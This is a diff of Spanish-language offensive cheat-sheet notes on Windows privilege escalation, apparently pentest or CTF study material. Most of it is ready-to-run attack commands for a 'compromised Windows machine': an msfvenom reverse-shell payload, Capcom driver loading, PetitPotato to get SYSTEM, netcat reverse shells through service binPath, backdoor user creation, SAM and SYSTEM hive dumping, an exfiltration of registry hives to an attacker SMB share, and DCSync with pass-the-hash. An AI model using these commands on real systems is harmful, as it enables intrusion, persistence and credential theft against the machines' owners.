@@ -99,14 +99,18 @@ Cada uno de estos privilegios otorga la capacidad de realizar acciones concretas
 Pasos:
 ❯ https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp    # Copiar el codigo en Visual studio creando un nuevo proyecto 'Aplicación de consola'. Guardar con 'Release' y complilarlo con 'Compilar solución' y transferir 'EoPLoadDriver.exe' a la máquina Windows comprometida
 ❯ https://github.com/FuzzySecurity/Capcom-Rootkit/tree/master/Driver    # Descargar el archivo 'Capcom.sys' y transferirlo a la máquina Windows comprometida
-❯ .\EoPLoadDriver.exe System\CurrentControlSet\MyService C:\Windows\Temp\Capcom.sys  # Cargar el driver y debe de mostrar 'NTSTATUS: 00000000, WinError: 0'
+
+❯ .\EoPLoadDriver.exe System\CurrentControlSet\MyService C:\Windows\Temp\Capcom.sys  # Cargar y ejecutar el driver en Windopws. Debe de mostrar lo siguiente: 'NTSTATUS: 00000000, WinError: 0'
+
 ❯ https://github.com/tandasat/ExploitCapcom   # Descargar el proyecto completo en zip para abrirlo desde Visual Studio. Modificar la linea de 'LaunchShell' y colocar "C:\\ProgramData\\reverse.exe". Guardar con 'Release' y complilarlo con 'Compilar solución' y transferir 'ExploitCapcom.exe' a la máquina Windows comprometida
-❯ msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=443 -f exe -o reverse.exe  # Crear el archivo al cual llamará 'ExploitCapcom.exe' al momento de ejecutarse y transferirlo a la máquina Windows comprometida
+
+❯ msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=443 -f exe -o reverse.exe  # Crear el archivo malicioso en Kali y transferirlo a la máquina Windows comprometida
+
 ❯ .\ExploitCapcom.exe        # Ejecutar el archivo en Windows y obtener la revershell en Kali 
 
 Notas:
 	1. Si al momento de compilar da un error, eliminar '#include "stdafx.h"' y volverlo a compilar
-	2. La ruta donde compila los archivos la muestra en la consola 
+	2. La ruta donde compila los archivos Visual Studio los muestra por la consola 
 	3. Para obtener la revershell se debe estar en escucha con 'Netcat'
 ```
 
@@ -116,7 +120,7 @@ Notas:
 
 Pasos:
 ❯ https://github.com/wh0amitz/PetitPotato/releases/tag/v1.0.0   # Descargar el archivo y transferirlo a la máquina Windows comprometida 
-❯ PetitPotato.exe 3 cmd         # Crear una cmd con rl usuario 'NT Authority\System' 
+❯ PetitPotato.exe 3 cmd         # Crear una cmd con el usuario 'NT Authority\System' 
 	# EfsID = '3' es el numero de API a usar
 ❯ PetitPotato.exe 3 "whoami"    # Ejecutar un comando  
 ❯ PetitPotato.exe 3 "net user omar P4ssw0rd /add"               # Crear un user siendo 'NT Authority\System'
@@ -126,20 +130,6 @@ Pasos:
 Notas:
 	1. Despues de crear un usuario para tener persistencia, podemos ingresar a con RDP si esta abierto el puerto '3389'
 	2. También se pude utilizar 'RottenPotato o JuicyPotato'
-```
-
-```powershell
-3. 'SeBackupPrivilege' = Permite leer cualquier archivo del sistema, ignorando sus permisos NTFS. Se puede copiar archivos críticos del sistema como el 'SAM, SYSTEM o NTDS.dit', incluso si no tiene permisos NTFS explícitos para ello. Estos archivos contienen información sensible como: 'Hashes de contraseñas locales, Credenciales de cuentas del dominio (si es un DC) y Configuraciones de seguridad'
-
-
-Pasos:   
-❯ reg save hklm\sam C:\temp\sam.hive            # Hacer una copia de la SAM al directorio creado y se descarga
-❯ reg save hklm\system C:\temp\system.hive      # Hacer una copia del system y se descarga 
-
-❯ impacket-secretsdump -sam sam.hive -system system.hive LOCAL     # Dumpear los hashes de los usuarios desde Kali 
-
-Notas:
-	1. https://github.com/nickvourd/Windows-Local-Privilege-Escalation-Cookbook/blob/master/Notes/SeBackupPrivilege.md      # Forma de explotar 
 ```
 
 ## Grupos Windows para escalar 
@@ -154,8 +144,8 @@ Notas:
 
 Pasos: 
 ❯ https://github.com/VbScrub/AdSyncDecrypt/releases/tag/v1.0   # Descargar el archivo AdDecrypt.zip y extraer su contenido para obtener 'AdDecrypt.exe, mcrypt.dll' y transferir los archivos a la máquina Windows comprometida
-❯ 'C:\Program Files\Microsoft Azure AD Sync\Bin'  # Ir a la siguiente ruta y ejecutar el 'AdDecrypt.exe'
-❯ AdDecrypt.exe -FullSQL      # Ejecutar la herramienta para extraer credenciales del usuario Admin 
+❯ 'C:\Program Files\Microsoft Azure AD Sync\Bin'  # Ir a la siguiente ruta en Windows para ejecutar el 'AdDecrypt.exe'
+❯ AdDecrypt.exe -FullSQL      # Ejecutar la herramienta para extraer credenciales del usuario Administrator 
 
 Notas: 
 	1. El AdDecrypt.exe y mcrypt.dll se deben de encontrar en la misma carpeta
@@ -167,11 +157,14 @@ Notas:
 
 Pasos:
 ❯ nc.exe     # Descargar y tranferir el archivo a la máquina Windows comprometida para hacer la Revershell
-❯ services   # Mirar todos los servicios que se estan ejecutando 
+❯ services   # Mirar todos los servicios que se estan ejecutando en Windows 
 ❯ sc.exe create <service> binPath="C:\Users\omar\Desktop\nc.exe -e cmd IP 443"   # Crear un servicio 
 ❯ sc.exe config <service> binPath="C:\Users\omar\Desktop\nc.exe -e cmd IP 443"   # Modificar un servicio 
 ❯ sc.exe stop <service>         # Detener un servicio 
 ❯ sc.exe start <service>        # Iniciar un servicio 
+
+Notas:
+	1. Antes de iniciar el servicio, en Kali se debe de estar en 'listening' con 'Netcat' para establecer la Revershell 
 ```
 
 ```powershell 
@@ -185,11 +178,11 @@ Pasos:
 ```
 
 ```powershell
-4. 'Account Operators' = Si se esta en el grupo con 'GenericAll' sobre 'Exchange Windows Permissions' se puede crear un usuario y agregarlo al grupo. Además, si se tiene un usuario en el grupo 'Exchange Windows Permissions' con 'WriteDacl', se puede ejecutar un DCSync sobre el dominio para obtener los hashes de todos los usuarios y hacer un Pass-The-Hash
+4. 'Account Operators' = Si se esta en este grupo con derechos de 'GenericAll' sobre el grupo 'Exchange Windows Permissions' se puede crear un usuario y agregarlo al grupo. Además, si el grupo de 'Exchange Windows Permissions' tiene derechos de 'WriteDacl' sobre el dominio, se puede ejecutar un DCSync para obtener los hashes de todos los usuarios y hacer un Pass-The-Hash
 
 
 Pasos:
-❯ net user omar P4ssw0rd /add /domain       # Crear un usuario a nivel de dominio por pertenecer al grupo 'Account Operators'
+❯ net user omar P4ssw0rd /add /domain       # Crear un usuario a nivel de dominio por pertenecer al grupo 'Account Operators' en Windows 
 ❯ net group "Exchange Windows Permissions" omar /add     # Agregar al usuario al grupo 'Exchange Windows Permissions'
 ❯ net group        # Mirar los grupos existentes 
 ❯ net user omar    # Mirar la info del usuario 
@@ -206,9 +199,43 @@ Notas:
 	1. El comando de 'Add-DomainObjectAcl' solo se puede ejecutar cuando se carga el módulo de 'PowerView.ps1'
 
 
-# Hacer DCSync desde Kali 
+# Hacer DCSync en Kali 
 ❯ impacket-secretsdump domain1.local/user@IP-DC    # Ejecutar el DCSync con el usuario creado
 	# IP-DC = La dirección IP del DC  
 ❯ impacket-psexec domain1.local/Administrator@IP cmd.exe -hashes :hash   # Utilizar 'psexec' para ingresar con el usuario 'Administrator' haciendo 'Pass-The-Hash'    
 ```
 
+```powershell 
+5. 'Backup Operators' = El usuario en este grupo recibe los privilegios de 'SeBackupPrivilege y SeRestorePrivilege' y permite leer cualquier archivo del sistema, ignorando sus permisos NTFS. Se puede copiar archivos críticos del sistema como el 'SAM, SYSTEM o NTDS.dit', incluso si no tiene permisos NTFS explícitos para ello. Estos archivos contienen información sensible como: 'Hashes de contraseñas locales, Credenciales de cuentas del dominio (si es un DC) y Configuraciones de seguridad'
+
+
+## FORMA 1
+Pasos:   
+❯ reg save hklm\sam C:\temp\sam.hive           # Hacer una copia de la SAM en Windows y descargarlo 
+❯ reg save hklm\system C:\temp\system.hive     # Hacer una copia del system en Windows y descargarlo
+
+❯ impacket-secretsdump -sam sam.hive -system system.hive LOCAL     # Dumpear los hashes de los usuarios desde Kali con los archivos obtenidos 
+
+Notas:
+	1. https://github.com/nickvourd/Windows-Local-Privilege-Escalation-Cookbook/blob/master/Notes/SeBackupPrivilege.md      # Forma de explotar 
+
+
+## FORMA 2
+Pasos:
+❯ https://github.com/horizon3ai/backup_dc_registry/blob/main/reg.py    # Descargar la tool 
+
+❯ python3 reg.py user:'passwd'@IP backup -p '\\IP\smbFolder'
+	# user:passwd = Credenciales validas del usuario que se encuentra en el grupo 'Backup Operators'
+	# IP = Dirección IP del DC
+	# \\IP\share = Recurso compartido con la IP de Kali para recibir los archivos a descargar 
+❯ impacket-smbserver smbFolder $(pwd) -smb2support    # Crear un server para recibir los archivos 'SAM, SECURITY y SYSTEM' y así poder hacer el dumpeo 
+
+❯ impacket-secretsdump -sam SAM -security SECURITY -system SYSTEM LOCAL     # Dumpear los hashes de los usuarios desde Kali con los archivos obtenidos 
+
+❯ impacket-secretsdump 'domain1.corp/user'@IP_DC -hashes :64fbae31cc352fc26af97cbdef151e03 # Hacer un DCSync
+	# hashes = Hash ':NT' del usuario 
+
+Notas:
+	1. Crear el recuros compartido antes de ejecutar la herramineta 'reg.py'
+	2. La ejecución de la herramienta 'reg.py' y el comando de 'impacket-smbserver' deben de ser en el mismo directorio en Kali para evitar un error 
+```
